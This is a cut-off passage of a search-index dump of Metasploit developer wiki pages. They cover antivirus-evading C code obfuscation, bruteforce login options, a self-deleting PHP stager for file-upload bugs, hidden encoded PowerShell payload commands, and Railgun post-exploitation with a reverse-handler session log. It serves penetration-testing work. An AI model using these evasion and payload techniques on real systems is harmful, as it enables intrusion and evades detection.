parse C code. The following components are built to parse and modify the source code. Code Factory Also known as Metasploit::Framework::Obfuscation::CRandomizer::CodeFactory . The CodeFactory module is used to make the random stubs that will get injected later in the source code. Currently, the things this class is capable of making include small stubs like if statements, a switch, fake functions, and Windows API calls, etc. Each stub tends to be small, and considered as benign by most AVs. Every class in CodeFactory, except for Base, FakeFunction, and FakeFunctionCollection, is a stub candidate that gets randomly selected and used in the source code. If a stub requires a native API call, then the class can specify @dep to set that dependency. If the source code does not support the API call, then the next stub candidate is used (or until one is found). For example, the CRandomizer::CodeFactory::OutputDebugString class is used to generate a fake OutputDebugString call, and the dependency is set as ['OutputDebugString'] . If the source code includes the Windows.h header, the CRandomizer knows it is okay to inject OutputDebugString. If not, CRandomizer will not use it. Modifier Also known as Metasploit::Framework::Obfuscation::CRandomizer::Modifier . The Modifier class decides how something should be modified, and actually modifies the source code, for example: a function, different if statements, loops, nested blocks, etc. While the modifier walks through the source, it will randomly inject extra code (provided by the CodeFactory class) at each statement, until there are no more functions to modify. Parser Also known as Metasploit::Framework::Obfuscation::CRandomizer::Parser . The main purpose of the Parser class is to convert the source code into a parsable format using Metasm, and then pass the functions to the Modifier class to process. Utility The Utility class provides quick-to-use methods that any CRandomizer classes could use. Code Example Creating a new stub First, add a new file under the code_factory with an arbitrary file name. For example: hello.rb. In this example, let's create a new stub that will printf() \"Hello World\". Your stub should be written as a class under the CodeFactory namespace, and make sure to inherit the Base class. Like this: require 'metasploit/framework/obfuscation/crandomizer/code_factory/base' module Metasploit module Framework module Obfuscation module CRandomizer module CodeFactory class Printf < Base def initialize super @dep = [ 'printf' ] end def stub %Q| int printf(const char*); void stub() { printf(\"Hello World\"); }| end end end end end end end Notice a couple of things: Every class should have its own stub method. And this stub method should return a string that contains the code you wish to inject. In addition, your code should be written as a function so that Metasm knows how to pick it up, hence the printf is in a void stub() function. If your stub requires a native API (in this case, we are using printf ), then you must add this function name in the @dep instance variable, which is an array. Please keep in mind that your stub should remain simple and small, and not unique. For example, avoid: Allocate a huge chunk of memory Avoid marking or allocating executable memory Loops Load referenced section, resource, or .data Anti-debugging functions from the Windows API Lots of function calls Unique strings APIs that access the Windows registry or the file system XOR Shellcode Any other suspicious code patterns that are unique to malware. Randomizing source code Please refer to tools/exploit/random_compile_c.rb for example.","title":"How to use Metasploit::Framework::Obfuscation::CRandomizer"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/#how-to-use-metasploitframeworkobfuscationcrandomizer","text":"","title":"How to use Metasploit::Framework::Obfuscation::CRandomizer"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/#what-is-crandomizer","text":"CRandomizer is an obfuscation feature in Metasploit Framework that allows you to randomize C code. It is done by injecting random statements such as native API calls, custom fake function calls, or other routines, etc. The CRandomizer is also supported by Metasploit Framework's code compiling API, which allows you to build a custom application that is unique (in terms of checksums), also harder to reverse-engineer. The randomness of the modification is based on a weight, an arbitrary number from 0 - 100. The higher the number, the more random the code gets.","title":"What is CRandomizer"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/#components","text":"CRandomizer relies on Metasm to be able to parse C code. The following components are built to parse and modify the source code.","title":"Components"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/#code-factory","text":"Also known as Metasploit::Framework::Obfuscation::CRandomizer::CodeFactory . The CodeFactory module is used to make the random stubs that will get injected later in the source code. Currently, the things this class is capable of making include small stubs like if statements, a switch, fake functions, and Windows API calls, etc. Each stub tends to be small, and considered as benign by most AVs. Every class in CodeFactory, except for Base, FakeFunction, and FakeFunctionCollection, is a stub candidate that gets randomly selected and used in the source code. If a stub requires a native API call, then the class can specify @dep to set that dependency. If the source code does not support the API call, then the next stub candidate is used (or until one is found). For example, the CRandomizer::CodeFactory::OutputDebugString class is used to generate a fake OutputDebugString call, and the dependency is set as ['OutputDebugString'] . If the source code includes the Windows.h header, the CRandomizer knows it is okay to inject OutputDebugString. If not, CRandomizer will not use it.","title":"Code Factory"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/#modifier","text":"Also known as Metasploit::Framework::Obfuscation::CRandomizer::Modifier . The Modifier class decides how something should be modified, and actually modifies the source code, for example: a function, different if statements, loops, nested blocks, etc. While the modifier walks through the source, it will randomly inject extra code (provided by the CodeFactory class) at each statement, until there are no more functions to modify.","title":"Modifier"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/#parser","text":"Also known as Metasploit::Framework::Obfuscation::CRandomizer::Parser . The main purpose of the Parser class is to convert the source code into a parsable format using Metasm, and then pass the functions to the Modifier class to process.","title":"Parser"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/#utility","text":"The Utility class provides quick-to-use methods that any CRandomizer classes could use.","title":"Utility"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/#code-example","text":"","title":"Code Example"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/#creating-a-new-stub","text":"First, add a new file under the code_factory with an arbitrary file name. For example: hello.rb. In this example, let's create a new stub that will printf() \"Hello World\". Your stub should be written as a class under the CodeFactory namespace, and make sure to inherit the Base class. Like this: require 'metasploit/framework/obfuscation/crandomizer/code_factory/base' module Metasploit module Framework module Obfuscation module CRandomizer module CodeFactory class Printf < Base def initialize super @dep = [ 'printf' ] end def stub %Q| int printf(const char*); void stub() { printf(\"Hello World\"); }| end end end end end end end Notice a couple of things: Every class should have its own stub method. And this stub method should return a string that contains the code you wish to inject. In addition, your code should be written as a function so that Metasm knows how to pick it up, hence the printf is in a void stub() function. If your stub requires a native API (in this case, we are using printf ), then you must add this function name in the @dep instance variable, which is an array. Please keep in mind that your stub should remain simple and small, and not unique. For example, avoid: Allocate a huge chunk of memory Avoid marking or allocating executable memory Loops Load referenced section, resource, or .data Anti-debugging functions from the Windows API Lots of function calls Unique strings APIs that access the Windows registry or the file system XOR Shellcode Any other suspicious code patterns that are unique to malware.","title":"Creating a new stub"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/#randomizing-source-code","text":"Please refer to tools/exploit/random_compile_c.rb for example.","title":"Randomizing source code"},{"location":"dev/dark/How-to-use-Msf-Auxiliary-AuthBrute-to-write-a-bruteforcer/","text":"How to use Msf::Auxiliary::AuthBrute to write a bruteforcer The Msf::Auxiliary::AuthBrute mixin should no longer be used to write a login module, you should try our LoginScanner API instead. However, some of the datastore options are still needed, so let's go over them right quick. Regular options USERNAME - (String) A specific username to authenticate as. PASSWORD - (String) A specific password to authenticate with. USER_FILE - (String) File containing usernames, one per line. PASS_FILE - (String) File containing passwords, one per line. USERPASS_FILE - (String) File containing users and passwords separated by space, one pair per line. BRUTEFORCE_SPEED - (Integer) How fast to bruteforce, from 0 to 5. VERBOSE - (Boolean) Whether to print output for all attempts. BLANK_PASSWORDS - (Boolean) Try blank passwords for all users. USER_AS_PASS - (Boolean) Try the username as the password for all users. DB_ALL_CREDS - (Boolean) Try each user/password couple stored in the current database. DB_ALL_USERS - (Boolean) Add all users in the current database to the list. STOP_ON_SUCCESS - (Boolean) Stop guessing when a credential works for a host. Advanced options REMOVE_USER_FILE - (Boolean) Automatically delete the USER_FILE on module completion. REMOVE_PASS_FILE - (Boolean) Automatically delete the PASS_FILE on module completion. REMOVE_USERPASS_FILE - (Boolean) Automatically delete the USERPASS_FILE on module completion. MaxGuessesPerService - (Integer) Maximum number of credentials to try per service instance. If set to zero or a non-number, this option will not be used. MaxMinutesPerService - (Integer) Maximum time in minutes to bruteforce the service instance. If set to zero or a non-number, this option will not be used. MaxGuessesPerUser - (Integer) Maximum guesses for a particular username for the service instance. Note that users are considered unique among different services, so a user at 10.1.1.1:22 is different from one at 10.2.2.2:22, and both will be tried up to the MaxGuessesPerUser limit. If set to zero or a non-number, this option will not be used. Reference https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/auth_brute.rb","title":"How to use Msf::Auxiliary::AuthBrute to write a bruteforcer"},{"location":"dev/dark/How-to-use-Msf-Auxiliary-AuthBrute-to-write-a-bruteforcer/#how-to-use-msfauxiliaryauthbrute-to-write-a-bruteforcer","text":"The Msf::Auxiliary::AuthBrute mixin should no longer be used to write a login module, you should try our LoginScanner API instead. However, some of the datastore options are still needed, so let's go over them right quick.","title":"How to use Msf::Auxiliary::AuthBrute to write a bruteforcer"},{"location":"dev/dark/How-to-use-Msf-Auxiliary-AuthBrute-to-write-a-bruteforcer/#regular-options","text":"USERNAME - (String) A specific username to authenticate as. PASSWORD - (String) A specific password to authenticate with. USER_FILE - (String) File containing usernames, one per line. PASS_FILE - (String) File containing passwords, one per line. USERPASS_FILE - (String) File containing users and passwords separated by space, one pair per line. BRUTEFORCE_SPEED - (Integer) How fast to bruteforce, from 0 to 5. VERBOSE - (Boolean) Whether to print output for all attempts. BLANK_PASSWORDS - (Boolean) Try blank passwords for all users. USER_AS_PASS - (Boolean) Try the username as the password for all users. DB_ALL_CREDS - (Boolean) Try each user/password couple stored in the current database. DB_ALL_USERS - (Boolean) Add all users in the current database to the list. STOP_ON_SUCCESS - (Boolean) Stop guessing when a credential works for a host.","title":"Regular options"},{"location":"dev/dark/How-to-use-Msf-Auxiliary-AuthBrute-to-write-a-bruteforcer/#advanced-options","text":"REMOVE_USER_FILE - (Boolean) Automatically delete the USER_FILE on module completion. REMOVE_PASS_FILE - (Boolean) Automatically delete the PASS_FILE on module completion. REMOVE_USERPASS_FILE - (Boolean) Automatically delete the USERPASS_FILE on module completion. MaxGuessesPerService - (Integer) Maximum number of credentials to try per service instance. If set to zero or a non-number, this option will not be used. MaxMinutesPerService - (Integer) Maximum time in minutes to bruteforce the service instance. If set to zero or a non-number, this option will not be used. MaxGuessesPerUser - (Integer) Maximum guesses for a particular username for the service instance. Note that users are considered unique among different services, so a user at 10.1.1.1:22 is different from one at 10.2.2.2:22, and both will be tried up to the MaxGuessesPerUser limit. If set to zero or a non-number, this option will not be used.","title":"Advanced options"},{"location":"dev/dark/How-to-use-Msf-Auxiliary-AuthBrute-to-write-a-bruteforcer/#reference","text":"https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/auth_brute.rb","title":"Reference"},{"location":"dev/dark/How-to-use-PhpEXE-to-exploit-an-arbitrary-file-upload-bug/","text":"Arbitrary file upload is surprisingly common among web applications, which can be abused to upload malicious files and then compromise the server. Usually, the attacker will select a payload based on whatever server-side programming language is supported. So if the vulnerable app is in PHP, then clearly PHP is supported, therefore an easy choice would be using a PHP payload such as Metasploit's PHP meterpreter. However, the PHP meterpreter does not share the same performance as, say, a Windows meterpreter. So in reality, what happens is you will probably want to upgrade to a better shell, which involves extra manual work during the process. So why limit your payload options? For this type of scenario, you should use the PhpEXE mixin. It serves as a payload stager in PHP that will write the final malicious executable onto the remote file system, and then clear itself after use, so it leaves no traces. Requirements To use the PhpEXE mixin, some typical exploitable requirements should be met: You must find a writeable location on the web server. The same writeable location should also be readable with a HTTP request. Note: For an arbitrary file upload bug, there is usually a directory that contains uploaded files, and is readable. If the bug is due to a directory traversal, then a temp folder (either from the OS or the web app) would be your typical choice. Usage First include the mixin under the scope of your Metasploit3 class like the following: include Msf :: Exploit :: PhpEXE Generate the payload (with the PHP stager) with get_write_exec_payload p = get_write_exec_payload If you're working on a Linux target, then you can set unlink_self to true, which will automatically clear the executable: p = get_write_exec_payload ( :unlink_self => true ) On Windows, you probably cannot clear the executable because it will probably still be in use. If it's not possible to automatically clean up malicious files, you should always warn the user about where they are, so they can do it manually later during the penetration test. Upload the payload At this point you can upload the payload generated by get_write_exec_payload , and then call it by using a GET request. If you do not know how to send a GET request, please refer to the following article: https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient Reference https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/php_exe.rb","title":"How to use PhpEXE to exploit an arbitrary file upload bug"},{"location":"dev/dark/How-to-use-PhpEXE-to-exploit-an-arbitrary-file-upload-bug/#requirements","text":"To use the PhpEXE mixin, some typical exploitable requirements should be met: You must find a writeable location on the web server. The same writeable location should also be readable with a HTTP request. Note: For an arbitrary file upload bug, there is usually a directory that contains uploaded files, and is readable. If the bug is due to a directory traversal, then a temp folder (either from the OS or the web app) would be your typical choice.","title":"Requirements"},{"location":"dev/dark/How-to-use-PhpEXE-to-exploit-an-arbitrary-file-upload-bug/#usage","text":"First include the mixin under the scope of your Metasploit3 class like the following: include Msf :: Exploit :: PhpEXE Generate the payload (with the PHP stager) with get_write_exec_payload p = get_write_exec_payload If you're working on a Linux target, then you can set unlink_self to true, which will automatically clear the executable: p = get_write_exec_payload ( :unlink_self => true ) On Windows, you probably cannot clear the executable because it will probably still be in use. If it's not possible to automatically clean up malicious files, you should always warn the user about where they are, so they can do it manually later during the penetration test. Upload the payload At this point you can upload the payload generated by get_write_exec_payload , and then call it by using a GET request. If you do not know how to send a GET request, please refer to the following article: https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient","title":"Usage"},{"location":"dev/dark/How-to-use-PhpEXE-to-exploit-an-arbitrary-file-upload-bug/#reference","text":"https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/php_exe.rb","title":"Reference"},{"location":"dev/dark/How-to-use-Powershell-in-an-exploit/","text":"PowerShell is a scripting language developed by Microsoft. It provides API access to almost everything in a Windows platform, less detectable by countermeasures, easy to learn, therefore it is incredibly powerful for penetration testing during post exploitation, or exploit development for payload execution. Take Metasploit's windows/smb/psexec_psh.rb module for example: it mimics the psexec utility from SysInternals, the payload is compressed and executed from the command line, which allows it to be somewhat stealthy against antivirus. There's only less than 30 lines of code in psexec_psh.rb (excluding the metadata that describes what the module is about), because most of the work is done by the Powershell mixin, nothing is easier than that. The command line will automatically attempt to detect the architecture (x86 or x86_64) that it is being run in, as well as the payload architecture that it contains. If there is a mismatch it will spawn the correct PowerShell architecture to inject the payload into, so there is no need to worry about the architecture of the target system. Requirements To use the PowerShell mixin, make sure you meet these requirements: The target machine supports PowerShell. Vista or newer should support it. You must have permission to execute powershell.exe You must be able to supply system command arguments. You must set up a command execution type attack in order to execute powershell.exe Usage To add PowerShell to your module, first you need to require it: require 'msf/core/exploit/powershell' And then include the mixin within the scope of the Metasploit3 class (or maybe Metasploit4 for some) include Msf :: Exploit :: Powershell Use the cmd_psh_payload method to generate the PowerShell payload. cmd_psh_payload ( payload . encoded , payload_instance . arch . first ) The actual output of cmd_psh_payload is a system command, which would look like the following format (as a one-liner): %COMSPEC% /B /C start powershell.exe -Command $si = New-Object System.Diagnostics.ProcessStartInfo;$si.FileName = 'powershell.exe'; $si.Arguments = ' -EncodedCommand [BASE64 PAYLOAD] '; $si.UseShellExecute = $false; $si.RedirectStandardOutput = $true;$si.WindowStyle = 'Hidden'; $si.CreateNoWindow = $True; $p = [System.Diagnostics.Process]::Start($si); A number of options can be used to adjust the final command depending on the circumstances of the exploit. By default the script is compressed but no encoding takes places of the wrapper. This produces a small command of around ~2000 characters (depending on the payload). Of these encode_final_payload is the most noteworthy as it will Base64 encode the full payload giving a very simple command with very few bad characters. However, the command length will increase as a result. Combining this with remove_comspec means the payload would very simply be: powershell.exe -nop -ep bypass -e AAAABBBBCCCCDDDD.....== Check out the other advanced options in the API documentation below. References https://dev.metasploit.com/api/Msf/Exploit/Powershell.html https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/powershell.rb https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/powershell/powerdump.ps1","title":"How to use Powershell in an exploit"},{"location":"dev/dark/How-to-use-Powershell-in-an-exploit/#requirements","text":"To use the PowerShell mixin, make sure you meet these requirements: The target machine supports PowerShell. Vista or newer should support it. You must have permission to execute powershell.exe You must be able to supply system command arguments. You must set up a command execution type attack in order to execute powershell.exe","title":"Requirements"},{"location":"dev/dark/How-to-use-Powershell-in-an-exploit/#usage","text":"To add PowerShell to your module, first you need to require it: require 'msf/core/exploit/powershell' And then include the mixin within the scope of the Metasploit3 class (or maybe Metasploit4 for some) include Msf :: Exploit :: Powershell Use the cmd_psh_payload method to generate the PowerShell payload. cmd_psh_payload ( payload . encoded , payload_instance . arch . first ) The actual output of cmd_psh_payload is a system command, which would look like the following format (as a one-liner): %COMSPEC% /B /C start powershell.exe -Command $si = New-Object System.Diagnostics.ProcessStartInfo;$si.FileName = 'powershell.exe'; $si.Arguments = ' -EncodedCommand [BASE64 PAYLOAD] '; $si.UseShellExecute = $false; $si.RedirectStandardOutput = $true;$si.WindowStyle = 'Hidden'; $si.CreateNoWindow = $True; $p = [System.Diagnostics.Process]::Start($si); A number of options can be used to adjust the final command depending on the circumstances of the exploit. By default the script is compressed but no encoding takes places of the wrapper. This produces a small command of around ~2000 characters (depending on the payload). Of these encode_final_payload is the most noteworthy as it will Base64 encode the full payload giving a very simple command with very few bad characters. However, the command length will increase as a result. Combining this with remove_comspec means the payload would very simply be: powershell.exe -nop -ep bypass -e AAAABBBBCCCCDDDD.....== Check out the other advanced options in the API documentation below.","title":"Usage"},{"location":"dev/dark/How-to-use-Powershell-in-an-exploit/#references","text":"https://dev.metasploit.com/api/Msf/Exploit/Powershell.html https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/powershell.rb https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/powershell/powerdump.ps1","title":"References"},{"location":"dev/dark/How-to-use-Railgun-for-Windows-post-exploitation/","text":"Railgun is a very powerful post exploitation feature exclusive to Windows Meterpreter. It allows you to have complete control of your target machine's Windows API, or you can use whatever DLL you find and do even more creative stuff with it. For example: say you have a meterpreter session on a Windows target. You have your eyes on a particular application that you believe stores the user's password, but it is encrypted and there are no tools out there for decryption. With Railgun, what you can do is you can either tap into the process and grep for any sensitive information found in memory, or you can look for the program's DLL that's responsible for the decryption, call it, and let it decrypt it for you. If you're a penetration tester, obviously post exploitation is an important skill to have, but if you don't know Railgun, you are missing out a lot. Defining a DLL and its functions The Windows API is obviously quite large, so by default Railgun only comes with a handful of pre-defined DLLs and functions that are commonly used for building a Windows program. These built-in DLLs are: kernel32, ntdll, user32, ws2_32, iphlpapi, advapi32, shell32, netapi32, crypt32, wlanapi, wldap32, version. The same list of built-in DLLs can also be retrieved by using the known_dll_names method. All DLL definitions are found in the \" def \" directory, where they are defined as classes. The following template should demonstrate how a DLL is actually defined: # -*- coding: binary -*- module Rex module Post module Meterpreter module Extensions module Stdapi module Railgun module Def class Def_somedll def self . create_dll ( dll_path = 'somedll' ) dll = DLL . new ( dll_path , ApiConstants . manager ) # 1st argument = Name of the function # 2nd argument = Return value's data type # 3rd argument = An array of parameters dll . add_function ( 'SomeFunction' , 'DWORD' , [ [ \"DWORD\" , \"hwnd\" , \"in\" ] ] ) return dll end end end ; end ; end ; end ; end ; end ; end In function definitions, Railgun supports these datatypes: VOID, BOOL, DWORD, WORD, BYTE, LPVOID, HANDLE, PDWORD, PWCHAR, PCHAR, PBLOB. There are four parameter/buffer directions: in, out, inout, and return. When you pass a value to an \"in\" parameter, Railgun handles the memory management. For example, MessageBoxA has a \"in\" parameter named lpText , and is of type PCHAR. You can simply pass a Ruby string to it, and Railgun handles the rest, it's all pretty straight forward. An \"out\" parameter will always be of a pointer datatype. Basically you tell Railgun how many bytes to allocate for the parameter, it allocates memory, provides a pointer to it when calling the function, and then it reads that region of memory that the function wrote, converts that to a Ruby object and adds it to the return hash. An \"inout\" parameter serves as an input to the called function, but can be potentially modified by it. You can inspect the return hash for the modified value like an \"out\" parameter. A quick way to define a new function at runtime can be done like the following example: client . railgun . add_function ( 'user32' , 'MessageBoxA' , 'DWORD' , [ [ \"DWORD\" , \"hWnd\" , \"in\" ] , [ \"PCHAR\" , \"lpText\" , \"in\" ] , [ \"PCHAR\" , \"lpCaption\" , \"in\" ] , [ \"DWORD\" , \"uType\" , \"in\" ] ] ) However, if this function will most likely be used more than once, or it's part of the Windows API, then you should put it in the library. Usage The best way to try Railgun is with irb in a Windows Meterpreter prompt. Here's an example of how to get there: $ msfconsole -q msf > use exploit/multi/handler msf exploit(handler) > run [*] Started reverse handler on 192.168.1.64:4444 [*] Starting the payload handler... [*] Sending stage (769536 bytes) to 192.168.1.106 [*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.106:55148) at 2014-07-30 19:49:35 -0500 meterpreter > irb [*] Starting IRB shell [*] The 'client' variable holds the meterpreter client >> Note that when you're running a post module or in irb, you always have a client or session object to work with, both point to same thing, which in this case is Msf::Sessions::Meterpreter_x86_Win . This Meterpreter session object gives you API access to the target machine, including the Railgun object Rex::Post::Meterpreter::Extensions::Stdapi::Railgun::Railgun . Here's how you simply access it: session . railgun If you run the above in irb, you will see that it returns information about all the DLLs, functions, constants, etc, except it's a little unfriendly to read because there's so much data. Fortunately, there are some handy tricks to help us to figure things out. For example, like we mentioned before, if you're not sure what DLLs are loaded, you can call the known_dll_names method: >> session.railgun.known_dll_names => [\"kernel32\", \"ntdll\", \"user32\", \"ws2_32\", \"iphlpapi\", \"advapi32\", \"shell32\", \"netapi32\", \"crypt32\", \"wlanapi\", \"wldap32\", \"version\"] Now, say we're interested in user32 and we want to find all the available functions (as well as return value's data type, parameters), another handy trick is this: session . railgun . user32 . functions . each_pair { | n , v | puts \"Function name: #{ n } , Returns: #{ v . return_type } , Params: #{ v . params } \" } Note that if you happen to call an invalid or unsupported Windows function, a RuntimeError will raise, and the error message also shows a list of available functions. To call a Windows API function, here's how: >> session.railgun.user32.MessageBoxA(0, \"hello, world\", \"hello\", \"MB_OK\") => {\"GetLastError\"=>0, \"ErrorMessage\"=>\"The operation completed successfully.\", \"return\"=>1} As you can see this API call returns a hash. One habit we have seen is that sometimes people don't like to check GetLastError , ErrorMessage , and/or the return value, they kind of just assume it works. This is a bad programming habit, and is not recommended. If you always assume something works, and execute the next API call, you risk having unexpected results (worst case scenario: losing the Meterpreter session). Memory Reading and Writing The Railgun class also has two very useful methods that you will probably use: memread and memwrite . The names are pretty self-explanatory: You read a block of memory, or you write to a region of memory. We'll demonstrate this with a new block of memory in the payload itself: >> p = session.sys.process.open(session.sys.process.getpid, PROCESS_ALL_ACCESS) => #<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 @client=#<Session:meterpreter 192.168.1.106:55151 (192.168.1.106) \"WIN-6NH0Q8CJQVM\\sinn3r @ WIN-6NH0Q8CJQVM\">, @handle=448, @channel=nil, @pid=2268, @aliases={\"image\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Image:0x007fe2c5a25828 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, \"io\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::IO:0x007fe2c5a257b0 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, \"memory\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Memory:0x007fe2c5a25738 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, \"thread\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Thread:0x007fe2c5a256c0 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>}> >> p.memory.allocate(1024) => 5898240 As you can see, the new allocation is at address 5898240 (or 0x005A0000 in hex). Let's first write four bytes to it: >> session.railgun.memwrite(5898240, \"AAAA\", 4) => true memwrite returns true, which means successful. Now let's read 4 bytes from 0x005A0000: >> session.railgun.memread(5898240, 4) => \"AAAA\" Be aware that if you supply a bad pointer, you can cause an access violation and crash Meterpreter. References: https://www.youtube.com/watch?v=AniR-T0AnnI https://www.defcon.org/images/defcon-20/dc-20-presentations/Maloney/DEFCON-20-Maloney-Railgun.pdf https://dev.metasploit.com/redmine/projects/framework/wiki/RailgunUsage https://github.com/rapid7/metasploit-framework/tree/master/lib/rex/post/meterpreter/extensions/stdapi/railgun http://msdn.microsoft.com/en-us/library/ms681381(VS.85).aspx http://msdn.microsoft.com/en-us/library/aa383749 http://undocumented.ntinternals.net/ http://source.winehq.org/WineAPI/","title":"How to use Railgun for Windows post exploitation"},{"location":"dev/dark/How-to-use-Railgun-for-Windows-post-exploitation/#defining-a-dll-and-its-functions","text":"The Windows API is obviously quite large, so by default Railgun only comes with a handful of pre-defined DLLs and functions that are commonly used for building a Windows program. These built-in DLLs are: kernel32, ntdll, user32, ws2_32, iphlpapi, advapi32, shell32, netapi32, crypt32, wlanapi, wldap32, version. The same list of built-in DLLs can also be retrieved by using the known_dll_names method. All DLL definitions are found in the \" def \" directory, where they are defined as classes. The following template should demonstrate how a DLL is actually defined: # -*- coding: binary -*- module Rex module Post module Meterpreter module Extensions module Stdapi module Railgun module Def class Def_somedll def self . create_dll ( dll_path = 'somedll' ) dll = DLL . new ( dll_path , ApiConstants . manager ) # 1st argument = Name of the function # 2nd argument = Return value's data type # 3rd argument = An array of parameters dll . add_function ( 'SomeFunction' , 'DWORD' , [ [ \"DWORD\" , \"hwnd\" , \"in\" ] ] ) return dll end end end ; end ; end ; end ; end ; end ; end In function definitions, Railgun supports these datatypes: VOID, BOOL, DWORD, WORD, BYTE, LPVOID, HANDLE, PDWORD, PWCHAR, PCHAR, PBLOB. There are four parameter/buffer directions: in, out, inout, and return. When you pass a value to an \"in\" parameter, Railgun handles the memory management. For example, MessageBoxA has a \"in\" parameter named lpText , and is of type PCHAR. You can simply pass a Ruby string to it, and Railgun handles the rest, it's all pretty straight forward. An \"out\" parameter will always be of a pointer datatype. Basically you tell Railgun how many bytes to allocate for the parameter, it allocates memory, provides a pointer to it when calling the function, and then it reads that region of memory that the function wrote, converts that to a Ruby object and adds it to the return hash. An \"inout\" parameter serves as an input to the called function, but can be potentially modified by it. You can inspect the return hash for the modified value like an \"out\" parameter. A quick way to define a new function at runtime can be done like the following example: client . railgun . add_function ( 'user32' , 'MessageBoxA' , 'DWORD' , [ [ \"DWORD\" , \"hWnd\" , \"in\" ] , [ \"PCHAR\" , \"lpText\" , \"in\" ] , [ \"PCHAR\" , \"lpCaption\" , \"in\" ] , [ \"DWORD\" , \"uType\" , \"in\" ] ] ) However, if this function will most likely be used more than once, or it's part of the Windows API, then you should put it in the library.","title":"Defining a DLL and its functions"},{"location":"dev/dark/How-to-use-Railgun-for-Windows-post-exploitation/#usage","text":"The best way to try Railgun is with irb in a Windows Meterpreter prompt. Here's an example of how to get there: $ msfconsole -q msf > use exploit/multi/handler msf exploit(handler) > run [*] Started reverse handler on 192.168.1.64:4444 [*] Starting the payload handler... [*] Sending stage (769536 bytes) to 192.168.1.106 [*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.106:55148) at 2014-07-30 19:49:35 -0500 meterpreter > irb [*] Starting IRB shell [*] The 'client' variable holds the meterpreter client >> Note that when you're running a post module or in irb, you always have a client or session object to work with, both point to same thing, which in this case is Msf::Sessions::Meterpreter_x86_Win . This Meterpreter session object gives you API access to the target machine, including the Railgun object Rex::Post::Meterpreter::Extensions::Stdapi::Railgun::Railgun . Here's how you simply access it: session . railgun If you run the above in irb, you will see that it returns information about all the DLLs, functions, constants, etc, except it's a little unfriendly to read because there's so much data. Fortunately, there are some handy tricks to help us to figure things out. For example, like we mentioned before, if you're not sure what DLLs are loaded, you can call the known_dll_names method: >> session.railgun.known_dll_names => [\"kernel32\", \"ntdll\", \"user32\", \"ws2_32\", \"iphlpapi\", \"advapi32\", \"shell32\", \"netapi32\", \"crypt32\", \"wlanapi\", \"wldap32\", \"version\"] Now, say we're interested in user32 and we want to find all the available functions (as well as return value's data type, parameters), another handy trick is this: session . railgun . user32 . functions . each_pair { | n , v | puts \"Function name: #{ n } , Returns: #{ v . return_type } , Params: #{ v . params } \" } Note that if you happen to call an invalid or unsupported Windows function, a RuntimeError will raise, and the error message also shows a list of available functions. To call a Windows API function, here's how: >> session.railgun.user32.MessageBoxA(0, \"hello, world\", \"hello\", \"MB_OK\") => {\"GetLastError\"=>0, \"ErrorMessage\"=>\"The operation completed successfully.\", \"return\"=>1} As you can see this API call returns a hash. One habit we have seen is that sometimes people don't like to check GetLastError , ErrorMessage , and/or the return value, they kind of just assume it works. This is a bad programming habit, and is not recommended. If you always assume something works, and execute the next API call, you risk having unexpected results (worst case scenario: losing the Meterpreter session).","title":"Usage"},{"location":"dev/dark/How-to-use-Railgun-for-Windows-post-exploitation/#memory-reading-and-writing","text":"The Railgun class also has two very useful methods that you will probably use: memread and memwrite . The names are pretty self-explanatory: You read a block of memory, or you write to a region of memory. We'll demonstrate this with a new block of memory in the payload itself: >> p = session.sys.process.open(session.sys.process.getpid, PROCESS_ALL_ACCESS) => #<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 @client=#<Session:meterpreter 192.168.1.106:55151 (192.168.1.106) \"WIN-6NH0Q8CJQVM\\sinn3r @ WIN-6NH0Q8CJQVM\">, @handle=448, @channel=nil, @pid=2268, @aliases={\"image\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Image:0x007fe2c5a25828 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, \"io\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::IO:0x007fe2c5a257b0 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, \"memory\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Memory:0x007fe2c5a25738 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, 